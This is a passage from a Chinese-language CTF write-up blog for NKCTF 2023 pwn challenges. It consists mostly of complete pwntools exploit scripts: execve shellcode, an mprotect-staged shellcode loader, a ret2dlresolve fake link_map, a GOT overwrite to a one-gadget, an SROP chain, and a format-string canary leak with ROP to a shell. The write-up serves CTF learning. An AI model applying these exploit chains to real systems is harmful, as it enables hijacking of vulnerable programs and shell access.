<span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token comment">#长度为15个字节</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov edi, 0x996100F    xor esi, esi    xor edx, edx    mov al, 59    xor ah, ah    syscall'''</span><span class="token triple-quoted-string string">"""#长度只有14个字节shellcode = '''    lea edi, [r15+0xe]    xor esi, esi    xor edx, edx    mov ax, 59    syscall'''"""</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#shellcode 长度为15个字节 而'/bin/sh' 7个字节，刚刚好0x16=22个字节，第二个shellcode只有14个字节</span><span class="token comment">#shllcode 15个字节，所以'/bin/sh'相对于0x9961000偏移为15</span><span class="token comment">#所以'/bin/sh'的地址为0x996100F</span><span class="token comment">#所以shellcode中 edi为0x996100F</span><span class="token comment">#第二个edi = r15 + 0xE是因为第二个shellocde只有14=0xE个字节</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin/sh'</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'shellcode!\n\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp2：</p><ul><li>调用一次mprotect函数将0x9961000的权限改回rwx，然后在写入shellcode</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token comment">#长度刚刚好22捏</span>shellcode1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov rdi, r15  /*由上面分析可知，r15里面的值就是0x9961000;这里也可以用shl edi,12;这里因为由上图可知rdi的值为0x9961*/    xor eax, eax     cdq   /*cdp指令会把edx的所以位全部赋值为eax的最高位*/    mov al, 10 /*mprotect的系统调用号*/    mov dl, 7 /*rwx = 7，权限为rwx*/    syscall /*调用mprotect函数，将0x9961000处的权限重新赋为rwx,由上图可知rsi的值为0x9961,所以这里不再对rsi赋值*/    xor eax, eax /*rax=0,read函数的系统调研号*/    mov esi, edi /*rdi=r15,这里我们直接从0x9961000开始写*/    mov edi, eax /*标准输入*/    mov dl, 0x50 /*输入大小0x50*/    syscall'''</span><span class="token comment">#execv(binsh, 0, 0)</span>shellcode2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov rsp, rsi /* rsp =rsi = r15 = 0x996100, 把栈移动到我能可写的地方*/    add rsp, 0x100 /*把栈往下移一下，以免我们写入的/bin/sh\x00字符串将代码覆盖了*/    xor rsi, rsi /*rsi = 0*/    xor edx, edx /*rdx = 0*/    push 0    mov rbx, 0x68732f2f6e69622f     push rbx/*写入/bin/sh\x00*/    mov rdi, rsp /*rdi = rsp = binsh*/    mov al, 59/*execv系统调用号*/    xor ah, ah /高8位清0*/    syscall'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'shellcode!\n\n'</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#因为之前的shellcode长度为0x16个字节，所以程序执行流在0x9961000 + 0x16处</span><span class="token comment">#所以我们需要先填充0x16个字节,这里填什么都无所谓，'\x90'对应的指令是nop</span>payload <span class="token operator">=</span> <span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">0x16</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方解答：</p><ul><li>利用xmm6中存放的是libc中的地址，进而泄露出libc地址，然而进行ROP</li></ul><p>没搞懂，官方解也没打通，以后在补吧&gt;_&gt;</p><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><p>这题只有一个read函数（溢出字长很大，本来我还想打ret2csu的，但是没办法泄漏libc&gt;_&lt;）</p><p>看了下笔记，标准的ret2dlresolve，模板题就加了个base64&gt;_&lt;。</p><blockquote><p>64位ret2dlresolve</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcs1 <span class="token operator">=</span> <span class="token string">b"V2VsY29tZSB0byBOS0NURiE="</span>s2 <span class="token operator">=</span> <span class="token string">b"dGVsbCB5b3UgYSBzZWNyZXQ6"</span>s3 <span class="token operator">=</span> <span class="token string">b"SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45"</span>s4 <span class="token operator">=</span> <span class="token string">b"Y2FuIHlvdSBmaW5kIG1lPw=="</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s2<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s3<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s4<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40167A</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>func<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x401660</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadbss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'next'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401683</span> <span class="token comment">#: pop rdi ; ret</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x0000000000401681</span> <span class="token comment">#: pop rsi ; pop r15 ; ret</span>l_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>r_offset <span class="token operator">=</span> bss <span class="token operator">+</span> l_addr <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> l_addr <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    l_addr <span class="token operator">+=</span> <span class="token number">0x10000000000000000</span>plt0 <span class="token operator">=</span> <span class="token number">0x401026</span>dynstr <span class="token operator">=</span> <span class="token number">0x4004D8</span>fake_link_map_addr <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x100</span>fake_dyn_strtab_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x8</span>fake_dyn_strtab <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span>fake_dyn_symtab_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x18</span>fake_dyn_symtab <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span>fake_dyn_rel_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x28</span>fake_dyn_rel <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span>fake_rel <span class="token operator">=</span> p64<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>fake_link_map  <span class="token operator">=</span> p64<span class="token punctuation">(</span>l_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> fake_dyn_strtabfake_link_map <span class="token operator">+=</span> fake_dyn_symtabfake_link_map <span class="token operator">+=</span> fake_dyn_relfake_link_map <span class="token operator">+=</span> fake_relfake_link_map  <span class="token operator">=</span> fake_link_map<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_strtab_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_symtab_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_rel_addr<span class="token punctuation">)</span>payload  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>fake_link_map<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>rop  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里看了下<a href="https://blog.csdn.net/m0_63437215/article/details/129825171?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168226451016800182164496%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168226451016800182164496&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-11-129825171-null-null.142%5Ev86%5Ewechat,239%5Ev2%5Einsert_chatgpt&amp;utm_term=nkctf&amp;spm=1018.2226.3001.4187">KingKi1L3r</a>大佬的做法，只能说秒，太妙了&gt;_&lt;</p><p>但是很可惜我没有打通，并且本地调试出来也跟他不一样，可以环境不一样吧）（</p></blockquote><p>利用<code>__do_global_dtors_aux</code>这个函数将read的got表改成了onegadget（libc-&gt;2.31,9.9）</p><p><img src="/2023/04/22/nkctf2023-wp/3.png"></p><p>在这里它会把<code>ebx+[rbp-0x3d]</code>的值给<code>rbp-0x3d</code>我们将ebx设置为<code>onegadget-read</code>，rbp设置为<code>read+0x3d</code>，这样执行完就把read的got表改为onegadget，然后执行read即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment">#r=remote('node2.yuzhian.com.cn',30427)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span> pop6<span class="token operator">=</span><span class="token number">0x40167a</span>change_read<span class="token operator">=</span><span class="token number">0x40117c</span>read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>offset<span class="token operator">=</span><span class="token number">0xFFFFFFFFFFFD5B3E</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'V2VsY29tZSB0byBOS0NURiE='</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'dGVsbCB5b3UgYSBzZWNyZXQ6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Y2FuIHlvdSBmaW5kIG1lPw=='</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token operator">+</span><span class="token number">0x3d</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token operator">+</span><span class="token number">0x3d</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>change_read<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x040146E</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="bytedance（待复现）"><a href="#bytedance（待复现）" class="headerlink" title="bytedance（待复现）"></a>bytedance（待复现）</h2><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><ul><li>srop板子题，没啥好说的</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcbinsh <span class="token operator">=</span> <span class="token number">0x404040</span>sig_ret <span class="token operator">=</span> <span class="token number">0x401146</span>syscall_ret <span class="token operator">=</span> <span class="token number">0x4011EE</span>write_binsh <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011C8</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'NKCTF!\n'</span><span class="token punctuation">,</span> write_binsh<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binshframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_retpayload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sig_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><ul><li>格式化字符串泄漏canary</li><li>my_read存在off by null漏洞，可以覆盖rbp低字节为0</li><li>call vuln后有一个leave，而vuln自己也有leave;ret；所以这里两次leave 存在栈迁移；但这里栈迁移是随机的，它会迁移到更低的栈地址，所以看运气了；我们在payload前面布置ret，让它往下滑</li></ul><blockquote><p>先泄漏libc</p><p>然后rop就行，</p></blockquote><p><img src="/2023/04/22/nkctf2023-wp/4.png"></p><p><img src="/2023/04/22/nkctf2023-wp/5.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./pwn"</span><span class="token comment">#context.log_level = 'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcpop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401413</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    <span class="token comment">#泄漏canary</span>    payload <span class="token operator">=</span> <span class="token string">b"%41$p"</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Hello, '</span><span class="token punctuation">)</span>    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#泄漏libc</span>    leak <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">27</span> <span class="token operator">+</span> leak <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'NKCTF: \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'carefully.\n'</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pust_addr:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#泄漏canary</span>    payload <span class="token operator">=</span> <span class="token string">b'%41$p'</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Hello, '</span><span class="token punctuation">)</span>    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'What'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#get shell</span>    shell <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token 